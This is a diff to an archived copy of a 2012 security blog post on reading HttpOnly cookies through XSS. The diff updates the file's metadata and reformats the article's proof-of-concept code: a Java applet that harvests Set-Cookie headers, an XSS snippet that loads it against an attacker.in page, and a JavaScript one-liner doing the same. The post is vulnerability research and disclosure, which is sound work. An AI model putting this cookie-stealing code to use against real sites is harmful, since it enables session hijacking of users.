@@ -6,26 +6,22 @@ resource: "https://web.archive.org/web/20170903113359/http://seckb.yehg.net/2012
 tags: [article, webseclist-reference, seckb-yehg-net, cookie, xss, java, flash, info-leak, session-fixation, filter-bypass, owasp-a03-2021, owasp-a05-2021, owasp-a07-2021]
 generated:
   by: webseclist-refs/1
-  at: "2026-08-10T15:58:06+00:00"
+  at: "2026-09-10T00:53:52+00:00"
 status: stable
-stale_after: 2027-08-10
+stale_after: 2027-09-10
 sources:
   - id: original
     resource: "https://web.archive.org/web/20170903113359/http://seckb.yehg.net/2012/06/xss-gaining-access-to-httponly-cookie.html"
     title: "XSS: Gaining access to HttpOnly Cookie in 2012"
     author: Aung Khant
-  - id: canonical
-    resource: "https://web.archive.org/web/20170925041004/http://seckb.yehg.net/2012/06/xss-gaining-access-to-httponly-cookie.html"
-  - id: capture
-    resource: "https://web.archive.org/web/20170903113359/http://seckb.yehg.net/2012/06/xss-gaining-access-to-httponly-cookie.html"
 also_at: []
 authors:
   - Aung Khant
-canonical_url: "https://web.archive.org/web/20170925041004/http://seckb.yehg.net/2012/06/xss-gaining-access-to-httponly-cookie.html"
+canonical_url: ""
 cited_by:
   - "2012.md:13"
 commit: ""
-content_sha256: d8e769a445075152c132bad278ecdba6e63f36557f7da6fa5e970b772144058a
+content_sha256: 2232d91a5437fcf6febab92320b1c492a9bfebb6a241c3498cf9effcfeda667e
 depth: full
 depth_reason: default
 kind: article
@@ -35,12 +31,12 @@ original_url: "https://web.archive.org/web/20170903113359/http://seckb.yehg.net/
 published: ""
 publisher: seckb.yehg.net
 publisher_english: ""
-raw_sha256: 749080dd849429b184c0872f2319ea3dfaf8aa2170c27d612b194180557e5172
-retrieved_from: "https://web.archive.org/web/20170925041004/http://seckb.yehg.net/2012/06/xss-gaining-access-to-httponly-cookie.html"
-retrieved_kind: live
-retrieved_utc: "2026-08-10T15:58:06+00:00"
+raw_sha256: bc67e083f9b845bb1074879e09250aa2a7e49f6213fc2473a97216c476b678af
+retrieved_from: "https://web.archive.org/web/20170903113359/http://seckb.yehg.net/2012/06/xss-gaining-access-to-httponly-cookie.html"
+retrieved_kind: manual-import
+retrieved_utc: "2026-09-10T00:53:52+00:00"
 slug: seckb-yehg-net-xss-gaining-access-httponly-cookie-2012
-snapshot: 20170903113359
+snapshot: ""
 title_english: ""
 translation_file: ""
 translation_of: ""
@@ -52,9 +48,7 @@ translation_of: ""
 
 - Published: date not stated
 - Original: <https://web.archive.org/web/20170903113359/http://seckb.yehg.net/2012/06/xss-gaining-access-to-httponly-cookie.html>
-- Current location: <https://web.archive.org/web/20170925041004/http://seckb.yehg.net/2012/06/xss-gaining-access-to-httponly-cookie.html>
-- Preserved from: https://web.archive.org/web/20170925041004/http://seckb.yehg.net/2012/06/xss-gaining-access-to-httponly-cookie.html (live) on 2026-08-10
-- Capture timestamp: 20170903113359
+- Preserved from: https://web.archive.org/web/20170903113359/http://seckb.yehg.net/2012/06/xss-gaining-access-to-httponly-cookie.html (manual-import) on 2026-09-10
 - Licence: unknown
 
 Rights remain with the original author and publisher. This is a research
@@ -127,215 +121,66 @@ page going offline. To read the original, follow the link above.
 
  Then left is Java. Looking through Java Http API, I found an interesting method, [getHeaderField](https://web.archive.org/web/20170925041004/http://docs.oracle.com/javase/7/docs/api/java/net/URLConnection.html#getHeaderField%28java.lang.String%29), under java.net.URLConnection package. I quickly wrote an applet that requests a URL and reads its response set-cookie response header using getHeaderField method.
 
--
 
- /*
-
--
-
--
-
- HttpOnly Applet - Stealing HttpOnly Cookie
-
--
-
- by Aung Khant, YGN Ethical Hacker Group, http://yehg.net/
-
--
-
--
-
- 2012-05-19
-
--
-
--
-
- Usage:
-
--
-
- <script>var ck= "";function getc(s){ck = s;alert("XSS HttpOnly-Cookie Stealer:\n\n" + ck);}</script><applet code=HO.class archive=HO.jar width=0 height=0><param name=u value=http://attacker.in/xss/cookie.php></applet>
-
--
-
- */
-
--
-
- importjavax.swing.*;
-
--
-
- importnetscape.javascript.*;
-
--
-
- importjava.net.*;
-
--
-
--
-
- publicclass HO extendsJApplet{
-
--
-
- JSObject win;
-
--
-
- String target, strcookies;
-
--
-
--
-
- publicvoid init(){
-
--
-
--
-
- win = JSObject.getWindow(this);
-
--
-
- target = getParameter("u");
-
--
-
- strcookies ="";
-
--
-
--
-
- try{
-
--
-
- SwingUtilities.invokeAndWait(newRunnable(){
-
--
-
- publicvoid run(){
-
--
-
--
-
- try{
-
--
-
- URL url =newURL(target);
-
--
-
- URLConnection connection = url.openConnection();
-
--
-
- connection.connect();
-
--
-
--
-
- String headerName =null;
-
--
-
- for(int i=1;(headerName =connection.getHeaderFieldKey(i))!=null; i++){
-
--
-
- if(headerName.equals("Set-Cookie")||headerName.equals("Set-Cookie2")){
-
--
-
- String cookie = connection.getHeaderField(i);
-
--
-
- String cookieName = cookie.substring(0, cookie.indexOf("="));
-
--
-
- String cookieValue =cookie.substring(cookie.indexOf("=")+1, cookie.length());
-
--
-
- strcookies = strcookies + cookieName +"="+cookieValue +"\n";
-
--
-
- }
-
--
-
- }
-
--
-
- Object results[];
-
--
-
- results =newObject[1];
-
--
-
- results[0]= strcookies;
-
--
-
- win.call("getc", results);
-
--
-
- }catch(Exception ex){
-
--
-
- ex.printStackTrace();
-
--
-
- }
-
--
-
- }
-
--
-
- });
-
--
-
- }
-
--
-
- catch(Exception ex){
-
--
-
- ex.printStackTrace();
-
--
-
- }
-
--
-
- }
-
--
-
- }
+```java
+/*
+
+HttpOnly Applet -  Stealing HttpOnly Cookie
+by Aung Khant, YGN Ethical Hacker Group, http://yehg.net/
+
+2012-05-19
+
+Usage:
+<script>var ck= "";function getc(s){ck = s;alert("XSS HttpOnly-Cookie Stealer:\n\n" + ck);}</script><applet code=HO.class archive=HO.jar width=0 height=0><param name=u value=http://attacker.in/xss/cookie.php></applet>
+*/
+import javax.swing.*;
+import netscape.javascript.*;
+import java.net.*;
+
+public class HO extends JApplet {
+        JSObject win;
+        String target, strcookies;
+
+    public void init() {
+
+                win = JSObject.getWindow(this);
+                target = getParameter("u");
+                strcookies = "";
+
+                try {
+                 SwingUtilities.invokeAndWait(new Runnable() {
+                                public void run() {
+
+                                        try{
+                                                URL url = new URL(target);
+                                                URLConnection connection = url.openConnection();
+                                                connection.connect();
+
+                                                String headerName = null;
+                                                for (int i=1; (headerName =connection.getHeaderFieldKey(i))!=null; i++) {
+                                                        if (headerName.equals("Set-Cookie") ||headerName.equals("Set-Cookie2")) {
+                                                                String cookie = connection.getHeaderField(i);
+                                                                String cookieName = cookie.substring(0, cookie.indexOf("="));
+                                                                String cookieValue =cookie.substring(cookie.indexOf("=") + 1, cookie.length());
+                                                                strcookies = strcookies + cookieName + "=" +cookieValue + "\n";
+                                                        }
+                                                }
+                                                Object results[];
+                                                results = new Object[1];
+                                                results[0] = strcookies;
+                                                win.call("getc",  results);
+                                        }catch(Exception ex){
+                                                ex.printStackTrace();
+                                        }
+                                }
+                 });
+                }
+            catch (Exception ex) {
+                 ex.printStackTrace();
+            }
+    }
+}
+```
 
  To my surprise, [it works](https://web.archive.org/web/20170925041004/http://attacker.in/xss/index.php?vuln=%3Cscript%3Evar+ck%3D+%22%22%3Bfunction+getc%28s%29{ck+%3D+s%3Balert%28%22XSS+HttpOnly-Cookie+Stealer%3A\n\n%22+%2B+ck%29%3B}%3C%2Fscript%3E%3Capplet+code%3DHO.class+archive%3DHO.jar+width%3D0+height%3D0%3E%3Cparam+name%3Du+value%3Dhttp%3A%2F%2Fattacker.in%2Fxss%2Fcookie.php%3E%3C%2Fapplet%3E)!
 
@@ -346,7 +191,9 @@ page going offline. To read the original, follow the link above.
 
  I thought Java would block the set-cookie response header with HttpOnly flag like Silverlight. As a side-note, the Java API can be directly called from JavaScript as well, removing the bundle of compiling. So, the nice one-liner PoC will be as follows:
 
- ***alert(new java.net.URL('http://attacker.in/xss/cookie.php').openConnection().getHeaderField('set-cookie'));***
+ ```javascript
+alert(new java.net.URL('http://attacker.in/xss/cookie.php').openConnection().getHeaderField('set-cookie'));
+```
 
  Why this can be an issue with Java itself, a vulnerable page in a real-world application may have already issued the HttpOnly cookie by the time the script has executed.
 
